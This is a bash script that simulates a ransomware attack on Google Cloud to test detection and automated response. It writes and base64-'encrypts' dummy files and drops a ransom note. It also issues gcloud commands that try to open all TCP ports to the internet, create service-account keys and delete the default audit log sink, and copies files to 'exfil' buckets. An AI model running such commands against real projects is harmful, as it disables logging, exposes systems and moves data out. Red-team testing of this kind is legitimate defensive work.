#!/bin/bash
# ransomware_simulation.sh — Simulates a ransomware attack pattern on GCP
# This script mimics ransomware behavior that SOAR should detect and contain:
# 1. Rapid file encryption (creates many encrypted files)
# 2. Mass unauthorized API calls (IAM, Compute, Storage)
# 3. Leaves ransom note artifacts
#
# ⚠️  FOR TESTING ONLY — Run inside the attacker container

set -e

echo "=============================================="
echo "  🔴 RANSOMWARE SIMULATION (Red Team Test)"
echo "=============================================="
echo ""
echo "⚠️  This simulates ransomware-like behavior."
echo "SCC should detect and SOAR should contain this."
echo ""

# Phase 1: Mass File Encryption (simulated)
echo "[Phase 1] Simulating mass file encryption..."
ENCRYPT_DIR="/tmp/ransomware_test"
mkdir -p "$ENCRYPT_DIR"

for i in $(seq 1 50); do
    echo "Sensitive data file #$i - $(date)" > "$ENCRYPT_DIR/important_doc_$i.txt"
    base64 "$ENCRYPT_DIR/important_doc_$i.txt" > "$ENCRYPT_DIR/important_doc_$i.txt.encrypted"
    rm -f "$ENCRYPT_DIR/important_doc_$i.txt"
done

echo "   ✅ 50 files 'encrypted' in $ENCRYPT_DIR"

# Phase 2: Drop ransom note
cat > "$ENCRYPT_DIR/README_RANSOM.txt" << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED!
This is a SIMULATION for SOAR testing purposes.
No real data was harmed. Contact your Blue Team.
EOF
echo "   ✅ Ransom note dropped"

# Phase 3: Mass unauthorized API calls (triggers Audit Log anomalies)
echo "[Phase 2] Simulating mass unauthorized API calls..."

# Attempt to create many service account keys (generates audit logs)
for i in $(seq 1 10); do
    gcloud iam service-accounts keys create /tmp/fake_key_$i.json \
        --iam-account="nonexistent-sa-$i@fake-project.iam.gserviceaccount.com" 2>/dev/null || true
done
echo "   ✅ 10 unauthorized SA key creation attempts logged"

# Attempt to modify firewall rules rapidly
for i in $(seq 1 5); do
    gcloud compute firewall-rules create "ransom-test-$i" \
        --allow=tcp:0-65535 --source-ranges="0.0.0.0/0" \
        --direction=INGRESS --priority=0 2>/dev/null || true
done
echo "   ✅ 5 unauthorized firewall modification attempts logged"

# Attempt to disable audit logging
gcloud logging sinks delete _Default 2>/dev/null || true
echo "   ✅ Audit log sink deletion attempt logged"

# Phase 4: Exfiltration attempt
echo "[Phase 3] Simulating data exfiltration attempt..."
for i in $(seq 1 5); do
    gsutil cp "$ENCRYPT_DIR/README_RANSOM.txt" "gs://nonexistent-bucket-exfil-$i/" 2>/dev/null || true
done
echo "   ✅ 5 GCS exfiltration attempts logged"

echo ""
echo "=============================================="
echo "  🎯 SIMULATION COMPLETE"
echo "=============================================="
echo "Expected SOAR Response:"
echo "  1. SCC should flag IAM anomalies within ~60s"
echo "  2. Audit Logs alert on audit sink deletion"
echo "  3. SOAR should auto-isolate the source VM"
echo "  4. Slack alert with AI summary should fire"
echo "=============================================="
